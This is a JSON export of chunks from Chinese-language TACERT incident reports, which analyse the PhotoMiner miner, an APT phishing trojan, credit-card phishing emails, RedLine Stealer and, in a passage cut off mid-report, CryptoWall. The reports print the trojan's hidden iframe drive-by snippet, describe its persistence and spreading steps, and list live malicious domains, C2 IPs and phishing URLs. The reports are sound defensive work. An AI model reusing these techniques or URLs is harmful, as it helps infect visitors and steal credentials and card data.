的網路磁碟機(代號Z)。 惡意程式樣本名稱為photo.scr 的執行檔,將程式photo.scr 放於Test1 主 機上執行。 2. 查看Test1 主機在執行程式photo.scr 後的對外連線狀況,發現該程式在1 秒間對外產生大量的21port 連線。 3. 檢視程式photo.scr 的屬性,發現該程式會產生大量執行緒(Thread),並執 行一些dll 檔(如:msvcrt.dll)。  3 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team 4. 檢視背景程式內容,發現程式photo.scr 執行後,會陸續呼叫一些cmd.exe 程式,透過cmd.exe 的執行又呼",
        "Page_Num": "1,2,3,4"
    },
    "503": {
        "File_Name": "個案分析-礦工木馬PhotoMiner病毒事件分析報告_10609.pdf",
        "content": "叫NsCpuCNMiner32.exe、reg.exe 與 xcopy.exe 等程式。下面將針對這些程式內容分別解析。 (1) cmd.exe(2404):啟動在TEMP 資料夾的NsCpuCNMiner32.exe,並提供礦池與 錢包的Hash 值資訊。 (2) NsCpuCNMiner32.exe:執行挖礦程式。 (3) cmd.exe(1948):存放四個礦池資訊於Temp 資料夾的pools.txt 中。 (4) cmd.exe(3068):在登錄檔中新增photo.scr 於每次啟動時執行。 (5) reg.exe:在登錄檔內 HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run 中新增一筆  4 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team photo.scr 在開機時啟動的註冊紀錄。 (6) cmd.exe(3356):對A 到Z 的磁碟機陸續執行程式xcopy.exe,將 photo.scr 依序複製到每個磁碟機中。 (7) xcopy.exe:將程式photo.scr 複製到A 到Z 的磁碟機中,若A 磁碟機為軟碟 機,則會出現錯誤訊息。 (8) 當執行cmd.exe(3356)時,在短短4 秒鐘內會執行程式xcopy.exe 26 次。 因為xcopy.exe 本身有延伸拷貝的能力,它會複製photo.scr 到所拜訪的磁 碟機中。當執行cmd.exe 完成後,會再一次重複循環執行cmd.exe 的動作。  5 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team 5. 當photo.scr 執行後,在Test1 主機發現其所持有的所有磁碟機(含網路磁碟 機Z)皆有程式photo.scr 存在,可見xcopy.exe 成功執行完成。 6. 將程式photo.scr 與NsCpuCNMiner32.exe 送至Virustotal 網站檢測,分別 被偵測出為惡意程式的比例為60/64 與58/64。  6 臺灣學術",
        "Page_Num": "4,5,6,7"
    },
    "504": {
        "File_Name": "個案分析-礦工木馬PhotoMiner病毒事件分析報告_10609.pdf",
        "content": "網路危機處理中心(TACERT) TANet Computer Emergency Response Team 7. 檢視側錄2 小時的封包內容,發現在短短2 小時期間,Test1 主機對外進行 102,103 次FTP 連線,所連線的國家數量高達200 個,並且嘗試使用5 個帳 號登入對方的FTP 伺服器。 8. 透過AutoRun 工具,發現在Logon 開機的部分,登錄檔的 HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RUN 內寫入開機後執 行photo.scr 等資訊。  7 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team 9. 使用Network Miner 工具分析封包,發現Test1 主機與Test2 主機之間有139 port 與445 port 連線,而且Test1 主機透過445 port 將photo.scr 傳送到 Test2 主機內。 10. 從photo.scr 程式碼與所截錄的封包,可以得知該惡意程式使用隨機IP 地 址及自帶的帳號與密碼字典進行暴力破解,因此若使用者使用懶人密碼則容 易被侵入系統。  8 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team 11. 分析所截錄的封包,發現當Test 1 主機對外進行大量的21port FTP 連線時, 嘗試進行暴力破解使用者帳戶與密碼。 12. 分析photo.scr 程式碼,發現該病毒核心內嵌cpuminer 工具,並且指定4  9 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team 個礦池,其中有2 個著名的門羅礦池moneropool.com 和minexmr.com。從程 式碼可以看見,除了登錄該程式隨系統啟動外,也將自身複製到所有可見磁 碟與內部網路連接的主機內。 13. 從photo.scr程式碼中發現該程式會去9個網站主機的其中一台下載最新版 的NSIS 腳本,這種方式可讓駭客在每次開始時更新惡意程式。將各主機所用 之網域名稱送至Virustotal 檢測,發現每一個主機皆為惡",
        "Page_Num": "7,8,9,10"
    },
    "505": {
        "File_Name": "個案分析-礦工木馬PhotoMiner病毒事件分析報告_10609.pdf",
        "content": "意網站,詳細資訊 如下表所示。 No. 網域 對應IP Virustotal 檢測率 1 stafftest.ru 176.126.84.24 7/65 2 hrtests.ru 176.126.85.92 5/64 3 profetest.ru 91.226.81.120 4/64 4 testpsy.ru 176.126.84.32 5/64 5 pstests.ru 151.80.9.92 5/64 6 qptest.ru 176.126.85.92 8/64 7 prtests.ru 136.243.126.105 4/64  10 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team No. 網域 對應IP Virustotal 檢測率 8 jobtests.ru 178.33.188.146 5/64 9 iqtesti.ru 79.174.73.100 3/64 (1)從此次檢測的封包紀錄發現Test1 主機以80 port 連線至stafftest.ru 的主 機,而且下載一個名稱為test.html.162CB78E.html 的檔案。 14. 從photo.scr 程式碼發現,一旦成功登陸管理帳戶,惡意程式便上傳本身副 本至所有可寫的伺服器中,接著感染FTP 伺服器上所託管的網站,因為該惡  11 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team 意程式會嘗試修改一些檔案類型, 如.php、.PHP、.htm、.HTM、.xml、.XML、.dhtm、.DHTM、.phtm、.xht、. htx、.mht、.bml、.asp、.shtm 等類型,此時能夠呈現給網站訪客的每個檔 案將被感染。 15. 在photo.scr 程式碼中,可以看到語法<iframe src=Photo.scr width=1 height=1 frameborder=0>...</iframe>,發現遭惡意iframe 掛馬的網頁會開 始透過瀏覽器將惡意程式偷偷下載至訪客的電腦上,目標IP、帳戶密碼和受 感染檔案列表統計將發送到後端伺服器。這些資訊能讓駭客稍後切換到其他 ",
        "Page_Num": "10,11,12"
    },
    "506": {
        "File_Name": "個案分析-礦工木馬PhotoMiner病毒事件分析報告_10609.pdf",
        "content": "淪陷FTP 主機或用戶端,以掌握更多受害者。  12 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team III. 網路架構圖 1. 駭客入侵不安全的FTP 主機並傳送photo.scr 至FTP 主機內。 2. 受害者瀏覽網站感染惡意程式photo.scr。  13 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team 3. 執行惡意程式photo.scr。 4. 連線至九台網站主機之一的主機內下載最新版的NSIS 腳本。 5. 以21 port 大量連線FTP 主機,並且進行暴力破解使用者帳號與密碼, 登入成功時上傳photo.scr 至FTP 主機內。 6. 執行cmd.exe 來呼叫挖礦程式NsCpuCNMiner32.exe 進行挖礦。 7. 執行cmd.exe 來存放礦池資訊於pools.txt 中。 8. 執行cmd.exe 來呼叫reg.exe,新增photo.scr 於啟動登錄檔內。 9. 執行cmd.exe 來呼叫xcopy.exe,將photo.scr 複製到A~Z 磁碟機中(含 網路磁碟機)。 10. 修改已入侵的FTP 主機內檔案與進行惡意iframe 的網頁掛馬。 IV. 建議與總結 1. 惡意程式Photo.scr 偽裝成螢幕保護程式,容易降低使用者戒心,進而執 行它,建議不要隨意開啟不明來源的程式。 2. 惡意程式Photo.scr 的傳染途徑是透過使用者拜訪已受感染的網站來傳 播,透過瀏覽器將惡意程式偷偷下載至訪客的電腦上,使用者很難發覺到 它,建議使用者平時定期做好電腦掃毒與資料備份作業。 3. Photo.scr 執行後會進行自我複製到電腦所有磁碟機中(含網路磁碟 機),建議關閉網路磁碟機所使用的445 port。 4. Photo.scr 執行後如沒有使用系統背景程式的檢測工具,很難發現到它的 存在,建議管理者當感覺系統效能變差時,除執行系統掃毒作業外,",
        "Page_Num": "12,13,14"
    },
    "507": {
        "File_Name": "個案分析-礦工木馬PhotoMiner病毒事件分析報告_10609.pdf",
        "content": "可使 用微軟公司的系統工具,如TCP View 與Process Explorer,來檢視網路 連線情況與背景程式執行情形。 5. 由於Photo.scr 會透過大量21 port 連線進行暴力破解FTP 伺服器的使用 者帳號與密碼,建議加強伺服器的存取控制機制與使用者密碼強度。 ",
        "Page_Num": "14"
    },
    "508": {
        "File_Name": "個案分析-社交工程郵件的APT攻擊事件分析報告_10505.pdf",
        "content": "個案分析- 社交工程郵件的APT 攻擊 事件分析報告 TACERT 臺灣學術網路危機處理中心團隊製 2016/5  1 I. 事件簡介 1. 近期接獲某學術單位多數人收到疑似APT 攻擊的社交工程郵件,該單位並 將此APT 郵件交給TACERT 進行分析測試。 2. 此信件的主旨為格式為「XXXXXX 會員服務提升」,寄件者偽造成該組織的 秘書名字,並透過 HINET 郵件地址發送給單組織成員。郵件內容提供附 加檔案「XXX 學會.rar」的解壓縮密碼以及網站登入的密碼進行誘騙。 3. 此郵件為典型的社交工程APT 攻擊郵件,信件的主旨內容以及相關資訊都 是針對該單位量身設計,並偽造成單位秘書去發送,並將附加檔案進行加 密,一旦感染則可能被駭客掌控重要資料。 4. 本單位透過虛擬主機進行隔離測試,並且側錄惡意程式的網路行為以及惡 意程式的運作情形進行分析。 II. 事件檢測 1. 該惡意程式的測試環境為Win 7(x64),將附件檔案RAR 解壓縮時會要求 輸入解壓縮密碼,測試只有信件提供的密碼「888888」才能解開。 2. RAR 壓縮檔解開後,會出現三個檔案,分別是dll、xml 和exe 執行檔, 且檔案名稱都是以該單位名稱命名。  2 3. 首先透過Virustotal 掃描該程式,其被偵測出的比例相當低,只有3/57, 算是客製化的惡意程式。 4. 實際執行該 EXE 執行檔,會出現一個登入介面為會員服務登錄系統,並 要求輸入身分證號和登入密碼,然而尚未輸入任何資料以前,防火牆就已 經出現外部網路存取權限要求,表示惡意程式已經開始產生網路行為。 5. 實際隨意輸入身分證號以及指定的登入密碼,該程式會開啟瀏覽器並且連 結至該單位的官方網站,並無出現任何額外訊息,表示該登入只是一般的 開啟網頁行為。 6. 此時透過 tcpview 工具檢查網路連線狀態,發現有大量的網路行為正在 產生,都是透過名稱為 svchost",
        "Page_Num": "1,2,3"
    },
    "509": {
        "File_Name": "個案分析-社交工程郵件的APT攻擊事件分析報告_10505.pdf",
        "content": ".exe 的惡意程式進行(紫色部分)。  3 7. 此時透過procexp 檢查背景程式執行狀況,會出現兩支異常的程式正在執 行,檔案名稱都是 scvhost.exe。 8. 檢查由 sx.exe 並無網路連線,而是由其呼叫PID 2120 的 svchost.exe 進行網路連線,目的端為207.226.137.88 的port 80,並且開啟TCP port 1357 接收C&C 指令。  4 9. 檢測IP 位址207.226.137.88,為位於美國的IP,且直接透過瀏覽器無法 開啟,應為駭客報到用的C&C 主機。 10. 透過檢查該連線的封包資料,都是以 HTTP GET 方式將資料送到 207.226.137.88 的port 80 接收,而且疑似將竊取的資訊加密塞入cookie 欄位傳送,而非常見的HTTP POST 方式。 11. 檢測另一個PID 588 的 svchost.exe,其也有固定的網路連線至美國的 104.202.173.64:80,然而該網址透過瀏覽器也是無法開啟,應同為報到 用的駭客C&C 主機。  5 12. 檢查連線104.202.173.64 的封包紀錄,svchost.exe 會透過 HTTP GET 方式連到美國主機104.202.173.64 的port 80,從回傳參數來看應該是 在做回報的動作。 13. 惡意程式 EXE 執行後,svchost.exe 除了對外部產生連線,也會對內 部網路進行主機掃描,都是針對TCP 或UDP port 1357。  6 14. 主機感染經過一段時間後,系統被會強制關機,判斷是駭客從C&C 主機 下指令操作,重新開機後檢查 autoruns 開機啟動區,發現有支程式會寫 入開機啟動區,名為notilv.exe 也就是svchost.exe,其連線IP 同為 104.202.173.64,可以確定此IP 為C&C 伺服器。 15. 透過virustotal 掃描 notilv.exe 也就是svchost.exe,可以發現為偵 測比率為 22",
        "Page_Num": "3,4,5,6,7"
    },
    "510": {
        "File_Name": "個案分析-社交工程郵件的APT攻擊事件分析報告_10505.pdf",
        "content": "/57 的木馬程式,讓駭客能夠進行遠端操控。  7 III. 網路架構圖 C&C主機 美國 104.202.173.64:80 TCP Port 1357 Listening State 駭客端 STEP 1 執行惡意程式 STEP 3 定期報到 HTTP GET 同網段其他APT受害者 STEP 4 掃描網段主機的 port 1357 下達指令給C&C APT社交工程郵件 C&C主機 美國 207.226.137.88:80 下達指令給C&C STEP 2 1.回報cookie資料 HTTP GET 2.接收C&C指令 1. 收到APT 攻擊的社交工程郵件,並且執行附件惡意程式 EXE 檔案。 2. 主機感染惡意程式後開啟TCP port 1357 接收C&C 指令,並且以HTTP GET 方式回傳資料給C&C。 3. 感染主機會定期向另一台C&C 主機已HTTP GET 方式回報。 4. 感染主機開始向同網段其他主機進行port 1357 掃描相同感染主機。 5. 駭客持續透過C&C 主機控制APT 攻擊受害主機。 IV. 建議與總結 1. 此個案主要是透過社交工程郵件的APT 攻擊感染,受害者很容易上當執行到  8 惡意程式。 2. 駭客針對該組織特性客製化惡意程式,讓使用者被操控成為殭屍電腦。 3. 受害主機會開啟port 1357 讓駭客端透過C&C 下達指令,執行攻擊動作、重 開機或刪除電腦資料等行為。 4. 使用者一旦開啟惡意程式後,惡意程式就會在系統背景隱藏執行,並且開機 自動啟用和掃描相同網段其他感染主機。 5. 此例為客製化惡意程式,防毒軟體偵測比例只有3/57,故使用者很容易受害。 6. 使用者對於有附加檔案或網址的郵件開啟前務必仔細檢查,以免遭受病毒感 染。 ",
        "Page_Num": "7,8,9"
    },
    "511": {
        "File_Name": "個案分析-竊取信用卡卡號之釣魚信件分析報告.pdf",
        "content": "TLP:WHITE 竊取信用卡卡號之釣魚信件 分析報告 臺灣學術網路危機處理中心團隊(TACERT)製 2021 年05 月  1 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team 一、 事件簡介 2021/3 初至2021/4 中旬TACERT 的Service 信箱陸續接到6 封偽裝來自中華郵政 的釣魚信件,這些信件以包裹無法送達是因為沒有繳納關稅(369 元台幣)的名義 寄出。為了瞭解這些釣魚信的詐騙行為,本中心對這6 封信件進行檢測。 二、事件檢測 1. 首先,依照信件收信時間對信件依序編號第1~ 6 號如下。 信件編號 收信日期 寄件者信箱 1 2021/3/2 下午 01:56 Chunghwa Post | 中華郵政 ✅ <support9104186180429756842@mm.syria.press> 2 2021/3/2 下午 04:53 Chunghwa Post | 中華郵政 ✅ <support0a2e2fa045bf15ab1372272cbde69d95@andre a-weigel.de> 3 2021/3/26 下午05:39 中華郵政 <iniu54905652@web-worker-linux.whservidor.com> 4 2021/3/30 上午10:00 Chunghwa Post | 中華郵政 <support4c2x8j2v967pqmg01@hustlersedition.com> 5 2021/4/8 上午 08:46 中華郵政 <dev54395186@mundialcc.com.br> 6 2021/4/19 上午08:40 中華郵政 ✅ <support@elmhandball.de> 本次檢測將以第6 封信件為主要檢測對象,並且與其他5 封信件進行特徵比 對,以了解駭客在製作釣魚信件的手法。 2. 開啟第6 封信件得知: (1) 該信件以「中華郵政客戶服務」名義自support@elmhandball.de 寄出信件。 (2) 該信告訴收信者您的包裹因為沒有繳納關稅369 元故無法交付",
        "Page_Num": "1,2"
    },
    "512": {
        "File_Name": "個案分析-竊取信用卡卡號之釣魚信件分析報告.pdf",
        "content": "。  2 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team (3) 提供商家名稱與訂單號碼企圖取信收件者。 (4) 提供確認包裹運輸情況與後續處理情形的連結給收信者查詢。 3. 第6 封信件內兩個「點擊這裡」的連結網址皆相同,點擊後會先開啟 「http://quantum-dental.de/wp.php 」。之後會轉址至信用卡付款頁面 (https://fmbpda.com/kio/Twa/internet/Group/f42cb/SSLAuthUI.html ),來提供收 信者以信用卡支付369 元的付款管道。  3 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team 4. 填入信用卡資訊後,按確認付款送出。接著會出現使用手機簡訊進行密碼驗 證的視窗訊息。  4 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team 5. 在手機簡訊進行密碼驗證方面,若驗證失敗會出現驗證失敗訊息。該訊息警 告收信者若輸入3 次錯誤代碼,除當前交易被取消外,信用卡也會被凍結。 經檢測發現,輸入3 次(含)以上錯誤代碼後,並無任何異常現象,推測此為 詐騙收信者要輸入正確的信用卡資訊的手法。 6. 第6 封信之信件連結網址(http://quantum-dental.de/wp.php)在2021/4/21 經 Virustotal 檢測其惡意比例為0/87,但在2021/5/3 再次檢測時其惡意比例變為 2/87。有兩家防毒軟體公司的防毒軟體判定該網址為釣魚網址或是惡意網址。 轉址網址(https://fmbpda.com/kio/Twa/internet/Group/f42cb/SSLAuthUI.html)經 Virustotal 檢測其惡意比例為11/87。  5 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team 7. 在第6 封信之信件內容最後面若往下看,經過一段空白後會出現以DHL 公司 名義所寫的信件內容,推",
        "Page_Num": "2,3,4,5,6"
    },
    "513": {
        "File_Name": "個案分析-竊取信用卡卡號之釣魚信件分析報告.pdf",
        "content": "測這內容可能為詐騙信件草稿。此段隱藏訊息告訴 收件者在14 天內需支付199 歐元來取得包裹,一樣提供點選的連結 (https://administrativos.cl/wp.php)給使用者點選。點連結後發現已無法開啟該 網頁。  6 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team 該網址(https://administrativos.cl/wp.php)經Virustotal 檢測後發現其惡意比例為 7/87 。 8. 檢視第6 封信之Mail Header 內容,發現信件一開始是從 rightby.store.d0m.de(IP:192.168.44.84)的郵件伺服器寄出。經過一次轉信後由 cg6-p04-ob.smtp.rzone.de 寄至TACERT 的郵件伺服器,由這些郵件伺服器資 訊可以得知信件來自德國。  7 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team 9. 檢測第1~5 封信件內容如下。 (1) 第1 封信: 該信件在2021/3/2 下午01:56 被寄出,而且信件內容與第6 封 信件內容相同,僅差別在第1 封信內容為英文版。第1 封信的信件連結網 址(http://pre.asocs.info/wp-maill.php)經Virustotal 檢測其惡意比例為0,但 是點選該連結後會轉址至 「https://www.afraso.org/sites/all/new.php?id=64406665」的網站。 轉址的網址「https://www.afraso.org/sites/all/new.php?id=64406665」經 Virustotal 檢測其惡意比例為2/87,僅兩家防毒軟體公司的防毒軟體可檢 測出其為釣魚網站。  8 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team 檢視第1 封信的MailHeader 發現該信件寄件者IP 為來自德國 IP:46.4.227.78。 (2) 第2 封信:",
        "Page_Num": "6,7,8,9"
    },
    "514": {
        "File_Name": "個案分析-竊取信用卡卡號之釣魚信件分析報告.pdf",
        "content": "信件內容與信件連結網址皆與第1 封信相同。 檢視第2 封信的MailHeader 發現該信件寄件者IP 為來自德國IP: 81.169.211.109。  9 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team (3) 第3 封信:該信件在2021/3/26 下午05:39 被寄出,其信件內容與第1 封信、 第2 封信相同,僅中、英文版的差異。信件連結網址 (https://cursedanarchy.com/new.php)經Virustotal 檢測其惡意比例為1/87, 有一家防毒軟體公司認為其為惡意網址。  10 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team 檢視第3 封信的MailHeader 發現該信件寄件者IP 為來自兩個德國IP: 195.225.209.16、195.158.54.3。 (4) 第4 封信: 該信件在2021/3/30 上午10:00 被寄出,其信件內容與第3 封 信相同。信件連結網址(http://pixlfeed.com/wp-admin/user/wp.php)經 Virustotal 檢測其惡意比例為0/87。  11 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team 檢視第4 封信的MailHeader 發現該信件寄件者IP 為來自美國IP: 74.208.58.198 與德國IP: 82.165.159.134。 (5) 第5 封信:該信件在2021/4/8 上午08:46 被寄出,而且信件內容與第3 封 信、第4 封信相同。信件連結網址(https://www.jonkeinteriors.co.za/web.php) 經Virustotal 檢測其惡意比例為3/87,但是點選該連結後會轉址至 「https://www.matchandshare.nl/home/Twa/internet/Group/?id=87854917」的 網站。  12 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team 轉址的網址",
        "Page_Num": "9,10,11,12,13"
    },
    "515": {
        "File_Name": "個案分析-竊取信用卡卡號之釣魚信件分析報告.pdf",
        "content": "「https://www.matchandshare.nl/home/Twa/internet/Group/?id=87854917」經 Virustotal 檢測其惡意比例為2/87,僅兩家防毒軟體公司的防毒軟體可檢 測出其為釣魚網站。 第5 封信與第6 封信的信件內容相同,僅信件最後隱藏底文的內容不同。 第5 封的底文內容請收件者在24 小時內存取帳戶並確認帳單資訊,若超 過24 小時則帳戶將被關閉。內容中也提供一個連結網址 (https/linkscm.com) ,但因網址的格式錯誤無法開啟網頁。 檢視第5 封信的MailHeader 發現該信件寄件者IP 為來自巴西IP:  13 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team 201.76.147.11。 10. 由前述檢測結果可得知這6 封信件的內容全都相同,僅中、英文版與是否有 隱藏底文的差異。彙整這6 封信件的寄件者IP 與連結網址資訊如下表,由表 中可以知道這些信件的寄件者IP 大都來自德國,而且信中所用的連結網址都 不固定。因此,這些網址在短時間內能被防毒軟體判定為惡意網址的比例很 低。 信件 編號 寄件者IP 點擊網址 Virustotal 轉址網址 Virustotal 1 46.4.227.78 (德國) http[://]pre[.]asocs[ .]info/wp-maill.php 0 https[://]www[.]af raso[.]org/sites/all /new.php?id=6440 6665 2/87 2 81.169.211.109 (德國) http[://]pre[.]asocs[ .]info/wp-maill.php 0 https[://]www[.]af raso[.]org/sites/all /new.php?id=3847 6680 2/87 3 195.225.209.16 (德國) 195.158.54.3 (德國) https[://]cursedanar chy[.]com/new.php 1/87",
        "Page_Num": "13,14"
    },
    "516": {
        "File_Name": "個案分析-竊取信用卡卡號之釣魚信件分析報告.pdf",
        "content": "--- --- 4 74.208.58.198 (美國) 82.165.159.134 (德國) http[://]pixlfeed[.]c om/wp-admin/user/ wp.php 0 --- --- 5 201.76.147.11 (巴西) https[://]www[.]jon keinteriors[.]co[.]za /web.php 3/87 https[://]www[.]m atchandshare[.]nl/ home/Twa/interne t/Group/?id=3734 5812 2/87  14 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team 信件 編號 寄件者IP 點擊網址 Virustotal 轉址網址 Virustotal 6 rightby.store.d0 m.de(192.168.4 4.84)(德國) http[://]quantum-de ntal[.]de/wp.php 2/87 https[://]fmbpda[.] com/kio/Twa/inter net/Group/f42cb/S SLAuthUI.html 11/87 https[://]administrat ivos[.]cl/wp.php 7/87 三、攻擊行為示意圖 本案主要以第6 封信件的檢測為主,故攻擊行為的示意圖將以第6 封信的 攻擊行為來進行說明。 1. 駭客隨機以中華郵政名義寄出主旨為「您的包裹無法送達」的釣魚郵件。 2. 收信者打開釣魚郵件。 3. 收信者被誘騙點擊信中連結網址。 4. 連結網址轉址至偽冒的信用卡付款頁面。 5. 收信者於信用卡付款頁面輸入自己的信用卡卡號與信用卡資訊來支付369  15 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team 元。 6. 駭客透過信用卡付款頁面取得收信者的信用卡卡號與信用卡資訊。 7. 收信者確認付款後系統請收信者進行手機簡訊之密碼驗證作業。 8. 系統告知收信者密碼驗證失敗, 並警告輸入3 次錯誤密碼後交易會被取消, 信用卡會被凍結。 四、 總結與建議 1. 從本案可得知駭客",
        "Page_Num": "14,15,16"
    },
    "517": {
        "File_Name": "個案分析-竊取信用卡卡號之釣魚信件分析報告.pdf",
        "content": "在郵件內容的製作上,由一開始英文版內容漸漸轉變為 中文版的信件內容。雖然內容皆相同,但若收信者為可閱讀中文者則可取 信於收信者。 2. 因釣魚郵件寄出一段時間後點擊的網址會被舉報為惡意網址,故駭客每批 寄出的信件之點擊網址皆不同。多數信件的點擊網址會加入轉址功能,來 轉址至信用卡付款頁面。 3. 從信用卡付款頁面的設計可得知駭客誘騙收信者提供信用卡卡號與信用 卡資訊的網頁做的如同一般線上刷卡付款的頁面,將提高收信者的信任 度。 4. 收信者在輸入信用卡卡號與信用卡資訊並點選「確認付款」按鈕後,駭客 就取得收信者的信用卡卡號與信用卡資訊,推測手機簡訊之密碼驗證作業 僅為取信於收信者而設計。 5. 由「系統告知密碼驗證失敗,並警告輸入3 次錯誤密碼後交易會被取消, 信 用卡會被凍結」等訊息,推測此為駭客詐騙收信者要輸入正確的信用卡資 訊的手法。若一直無法驗證成功,也可讓收信者誤認為交易已被取消,沒 有付款成功,進而降低收信者的防備之心。 6. 從6 封釣魚信件的寄出信件IP 可得知這些信件大部分由德國的郵件伺服 器寄出 。  16 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team 7. 對於預防本案的攻擊事件,有下列幾點防護措施提供參考。 (1) 不隨意開啟不明來源的信件。 (2) 不隨意點選(開啟)不明來源的網址(網頁)。 (3) 當信件內容要求進行線上刷卡付款時,需特別確認寄件者的身分與刷 卡網址的真實性。 (4) 若不慎將信用卡資訊透過不明網址提供給不明人士,建議停用該信用 卡, 以避免信用卡被盜刷之風險。 ",
        "Page_Num": "16,17"
    },
    "518": {
        "File_Name": "個案分析-竊密軟體RedLine Stealer分析報告.pdf",
        "content": "TLP:WHITE 竊密軟體RedLine Stealer 分析報告 臺灣學術網路危機處理中心團隊(TACERT)製 2022 年08 月  1 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team 一、事件簡介 1. 在2022/3~2022/7 期間學術網路發生Redline 攻擊事件共有96 件,其中在 2022/4 達攻擊高峰(有35 件),受攻擊對象以大專院校居多。 資安事件數量 大專院校 66 高中職 8 國小 4 國中 5 縣市區網路中心 13 總計 96 2. RedLine Stealer 於2020/2 首次被發現,它主要通過釣魚郵件或偽裝成安裝檔 案的惡意軟體(如Telegram、Discord 和破解軟體)進行散播。 3. 下圖為其散播方式歷程,近期它利用 YouTube Video Description 和 Google Ads 下載包含 Redline Stealer 的Chrome 擴展程式的網路釣魚連結,或通過 FTP 執行Redline Stealer 的Python 腳本正在散播。  2 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team 資料來源: https://medium.com/s2wblog/deep-analysis-of-redline-stealer-leaked-credential-with-wcf- 7b31901da904 4. 為了解RedLine Stealer 的攻擊行為,故對其樣本進行檢測作業。 二、 事件檢測 1. 在32 位元的Windows7 作業系統上,分別執行兩個Redline Stealer 樣本,來 觀察它們的行為。 (1)樣本1 為59455ab.exe (MD5:2fda110a8763ef6d0d50d02c77d1de9c) (2)樣本2 為253679ff.exe (MD5:189b13d2054550c98e1e248723c43475) 253679ff.exe 之內容與59455ab.exe 不同,有檔案所屬版權資訊。 2. 兩樣本經Virustotal 檢測其惡意比例如下。 59455ab.exe 之Virustotal 檢測結果為49/71。",
        "Page_Num": "1,2,3"
    },
    "519": {
        "File_Name": "個案分析-竊密軟體RedLine Stealer分析報告.pdf",
        "content": "253679ff.exe 之Virustotal 檢測結果為55/71。  3 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team 3. 兩個樣本執行後之程式運作與連線行為如下。 (1) 樣本1 59455ab.exe 執行後會呼叫AppLaunch.exe 來執行。 AppLaunch.exe 執行後會連線俄羅斯IP:185.186.142.127。 由連線紀錄發現約每隔20 秒會連線一次。 (2) 樣本2 253679ff.exe 執行後會呼叫InstallUtil.exe 來執行。 InstallUtil.exe 執行後會連線俄羅斯IP:213.226.123.155。 由連線紀錄發現約每隔20 秒會連線一次。  4 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team 4. 分析兩個樣本所連線的俄羅斯IP 封包,發現檢測時未傳輸任何內容,僅單獨 建立連線。 三、 攻擊行為 1. 駭客通過社交工程攻擊散播Redline stealer。 2. 在受害主機上執行Redline stealer 程式來呼叫其他程式進行連線,例如:樣本1  5 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team 呼叫AppLaunch.exe,樣本2 呼叫InstallUtil.exe。 3. 受害主機約每20 秒連線一次俄羅斯IP。 四、 總結與建議 1. Redline Stealer 是學術網路中常見的惡意程式,也是惡意程式檢測網站 ANYRUN 每週上傳程式樣本數量之前五名之一。 2. 它可從瀏覽器、系統和安裝的軟體中收集使用者的機密資料,收集的資訊包 括系統資訊、瀏覽器憑證、加密錢包資訊、FTP 資訊、Telegram 和Discord 資訊等。在收集和洩露資訊後,Redline Stealer 還具有下載可執行檔案和執行 附加惡意行為的能力。 3. 本次檢測兩個樣本發現其會每隔20 秒持續連線俄羅斯IP,保持對受害主機 的連線。 4. 在處理此類型攻擊事件時,受害主機可透過掃毒、檢視連線行為",
        "Page_Num": "3,4,5,6"
    },
    "520": {
        "File_Name": "個案分析-竊密軟體RedLine Stealer分析報告.pdf",
        "content": "與背景程式, 來查找惡意程式所在之處,以利移除它。 ",
        "Page_Num": "6"
    },
    "521": {
        "File_Name": "個案分析-綁架勒索電腦檔案的惡意程式事件分析報告_10409.pdf",
        "content": "個案分析- 綁架勒索電腦檔案的惡意程 式事件分析報告 TACERT 臺灣學術網路危機處理中心團隊製 2015/9  1 I. 事件簡介 1. 近年來惡意程式越來越多樣化,以往都只是感染主機成為中繼站或殭屍 電腦,但另一種的惡意程式卻會破壞使用者的檔案資料,並且勒索使用 者相當的金額,造成嚴重損害。 2. 學術網路中的確有部分主機遭受過惡意勒索軟體(ransomware)的侵害, 然而往往找不出明確的感染途徑及惡意程式樣本。 3. 受害者往往必須向駭客支付比特幣作為檔案的解密贖金。 4. 本單位取得的惡意程式樣本進行研究分析,主要以CryptoWall 的惡意勒 索軟體測試。 II. 事件檢測 1. 使用VM 虛擬主機並且為Windows 7 系統進行隔離環境測試。 2. 惡意程式樣本名稱為 CTBLOCKER.exe,實際執行後原本的惡意程式會開 始針對內部文件、影音、圖像檔案進行加密,然後惡意程式主體就會自 我刪除。 3. 透過Virustotal 線上掃毒,該病毒的檢測比例 41/57 相當高,為 CryptoWall 3.0 的勒索軟體。 4. 測試時候將其中一個資料夾內放入一些文件檔,包含了docx、xlsx、 jpg、pdf 四種格式檔案做測試,而惡意程式感染後的確就無法正常再開  2 啟這些檔案。 5. 當所有磁碟內部的關聯檔案都被加密後,在被加密的檔案資料夾中產生 